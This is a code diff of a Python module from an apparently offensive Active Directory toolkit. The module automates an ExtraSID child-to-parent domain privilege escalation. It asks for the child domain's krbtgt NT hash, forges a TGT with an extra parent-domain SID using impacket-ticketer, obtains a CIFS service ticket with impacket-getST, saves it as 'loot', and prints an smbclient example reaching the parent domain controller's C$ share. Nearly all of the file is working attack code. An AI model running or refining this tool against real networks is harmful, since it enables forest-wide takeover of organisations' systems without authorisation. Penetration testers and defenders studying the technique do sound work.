@@ -4,20 +4,22 @@ import os
 import subprocess
 import re
 import shutil
-from rich import print
 from core.colors import red, green, yellow, blue
+from core.helpers import save_loot
+from rich import print
 
 def is_valid_sid(sid):
     return bool(re.match(r"^S-\d-\d+(-\d+){1,}$", sid))
 
 def run(session):
-    print(blue("[*] Preparing ExtraSID privilege escalation attack..."))
+    print(blue("[*] Starting ExtraSID privilege escalation (child → parent)..."))
 
     child_domain = session.domain
     dc_ip = session.dc_ip
     username = session.username
 
-    print(f"[*] Current domain: {child_domain}, user: {username}")
+    # === Prompt inputs
+    print(blue(f"[*] Current session user: {username}@{child_domain}"))
 
     nthash = input("[?] Enter NT hash of krbtgt for child domain: ").strip()
     parent_domain = input("[?] Enter parent domain FQDN (e.g., finance.corp): ").strip()
@@ -28,15 +30,22 @@ def run(session):
         print(red("[-] One or more SIDs are invalid. Aborting."))
         return
 
-    if len(nthash) != 32 or not all(c in "0123456789abcdefABCDEF" for c in nthash):
-        print(red("[-] NT hash appears invalid. Must be 32 hex chars."))
+    if not re.fullmatch(r"[0-9a-fA-F]{32}", nthash):
+        print(red("[-] NT hash must be exactly 32 hex characters."))
+        return
+
+    if "." not in parent_domain:
+        print(red("[-] Invalid parent domain format (missing '.')."))
         return
 
     if not shutil.which("impacket-ticketer") or not shutil.which("impacket-getST"):
-        print(red("[-] Required Impacket tools (impacket-ticketer / impacket-getST) not found in PATH."))
+        print(red("[-] Required tools not found: impacket-ticketer / getST"))
         return
 
-    ticket_file = f"loot/{username}_extratgt.ccache"
+    tgt_file = f"loot/{username}_extratgt.ccache"
+    tgt_basename = tgt_file.replace(".ccache", "")
+
+    # === Step 1: Forge TGT
     tgt_cmd = [
         "impacket-ticketer",
         "-domain", child_domain,
@@ -45,26 +54,27 @@ def run(session):
         "-user-id", "500",
         "-groups", "512",
         "-extra-sid", f"{parent_sid}-512",
-        "-outputfile", ticket_file.replace(".ccache", ""),
+        "-outputfile", tgt_basename,
         username
     ]
 
-    print(blue("[*] Generating forged TGT with impacket-ticketer..."))
+    print(blue("[*] Generating TGT via impacket-ticketer..."))
     try:
         subprocess.run(tgt_cmd, check=True)
-        if os.path.exists(ticket_file):
-            print(green(f"[+] TGT created and saved to: {ticket_file}"))
-        else:
-            print(red("[-] TGT file not created. Something went wrong."))
-            return
     except subprocess.CalledProcessError as e:
-        print(red(f"[-] impacket-ticketer failed: {e}"))
+        print(red(f"[-] TGT creation failed: {e}"))
         return
 
-    # Load ticket in memory
-    os.environ["KRB5CCNAME"] = os.path.abspath(ticket_file)
-    os.putenv("KRB5CCNAME", os.path.abspath(ticket_file))
+    if not os.path.exists(tgt_file):
+        print(red("[-] TGT file was not created. Something failed."))
+        return
 
+    print(green(f"[+] TGT saved: {tgt_file}"))
+    os.environ["KRB5CCNAME"] = os.path.abspath(tgt_file)
+    os.putenv("KRB5CCNAME", os.path.abspath(tgt_file))
+    print(green("[+] TGT loaded into memory (env KRB5CCNAME set)"))
+
+    # === Step 2: Get ST
     spn = f"CIFS/{parent_domain.split('.')[0]}-dc.{parent_domain}"
     getst_cmd = [
         "impacket-getST",
@@ -73,10 +83,17 @@ def run(session):
         f"{child_domain}/{username}"
     ]
 
-    print(blue(f"[*] Requesting ST for {spn} with impacket-getST..."))
+    print(blue(f"[*] Requesting ST for: {spn}"))
     try:
         subprocess.run(getst_cmd, check=True)
-        print(green("[+] Service ticket (ST) obtained successfully."))
-        print(yellow("[*] You can now use KRB5CCNAME for privileged access on the parent domain."))
+        print(green("[+] Service ticket obtained via impacket-getST"))
+        save_loot("extratgt.log", f"TGT: {tgt_file}\nSPN: {spn}")
     except subprocess.CalledProcessError as e:
-        print(red(f"[-] impacket-getST failed: {e}"))
+        print(red(f"[-] ST request failed: {e}"))
+        return
+
+    # === Final Tip
+    print(blue("[*] You can now use KRB5CCNAME to access the parent domain"))
+    print(yellow("  Example:"))
+    print(yellow(f"    export KRB5CCNAME={tgt_file}"))
+    print(yellow(f"    smbclient -k \\\\{parent_domain.split('.')[0]}-dc\\C$"))
